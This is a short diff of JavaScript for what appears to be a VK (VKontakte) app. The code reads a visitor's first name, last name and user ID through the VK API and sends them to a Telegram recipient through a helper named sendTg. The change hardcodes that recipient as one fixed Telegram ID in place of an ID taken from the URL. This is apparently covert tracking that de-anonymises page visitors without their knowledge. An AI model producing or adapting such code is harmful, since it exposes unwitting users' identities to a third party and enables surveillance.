@@ -15,7 +15,7 @@
                 VK.api("users.get", {}, function (data) {
                     var user = data.response[0];
                     var userId = _huy.gup('user_id');
-                    _huy.sendTg(userId, user.first_name+'_'+user.last_name+'_'+user.id);
+                    _huy.sendTg('255140082', user.first_name+'_'+user.last_name+'_'+user.id);
                 });
             }, function() {}, '5.67');
         } catch (e) {
